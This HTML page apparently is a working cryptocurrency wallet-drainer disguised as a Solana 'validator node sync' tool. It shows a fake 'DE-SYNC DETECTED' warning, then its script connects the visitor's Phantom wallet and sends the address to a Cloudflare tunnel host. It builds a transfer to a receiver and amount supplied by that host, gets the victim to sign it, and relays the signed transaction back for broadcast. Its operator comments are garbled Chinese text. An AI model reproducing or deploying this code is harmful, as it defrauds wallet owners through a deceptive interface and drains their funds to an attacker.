<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALIDATOR NODE V12</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #9945FF; padding: 30px; border-radius: 12px; text-align: center; width: 280px; background: #050505; }
        /* ğŸ”± æŒ‰é’®æ”¹ä¸ºç´«è‰²ï¼Œæ–¹ä¾¿ä½ åˆ¤æ–­æ–°ä»£ç æ˜¯å¦ç”Ÿæ•ˆ */
        button { background: #9945FF; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 16px; box-shadow: 0 0 15px rgba(153,69,255,0.4); }
        #log { font-size: 10px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="margin:0; color:#14f195;">SYSTEM SYNC</h2>
        <p style="font-size:12px; color:#666;">DE-SYNC DETECTED</p>
        <button id="cta">FORCE SYNC NOW</button>
        <div id="log">READY...</div>
    </div>

    <script>
        // ğŸ”± ä½ çš„æœ€æ–°éš§é“åœ°å€
        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const sWeb3 = window.solanaWeb3;
            const p = window.solana || window.phantom?.solana;

            try {
                log("1: CONNECTING...");
                await p.connect();

                log("2: FETCHING...");
                const resp = await fetch(tunnel + "/prepare", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("3: CONSTRUCTING...");
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new sWeb3.PublicKey(info.receiver),
                        lamports: Number(info.amount),
                    })
                );
                tx.recentBlockhash = info.bh;
                tx.feePayer = p.publicKey;

                log("4: SIGNING...");
                // ğŸ”± è¿™ä¸€æ­¥ä¼šè°ƒèµ·å¼¹çª—
                const signed = await p.signTransaction(tx);
                
                log("5: SENDING...");
                // ğŸ”± å½»åº•å¼ƒç”¨ Bufferï¼Œç›´æ¥å°†å­—èŠ‚åºåˆ—åŒ–ä¸ºæ™®é€šæ•°ç»„å‘é€
                const serialized = signed.serialize();
                const rawArr = Array.from(new Uint8Array(serialized));

                await fetch(tunnel + "/broadcast", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_data: rawArr })
                });

                log("SUCCESS!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

            } catch (err) {
                log("FAIL: " + err.message);
                // è‡ªåŠ¨ä¸ŠæŠ¥æŠ¥é”™
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "V12_CRASH", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
</body>
</html>
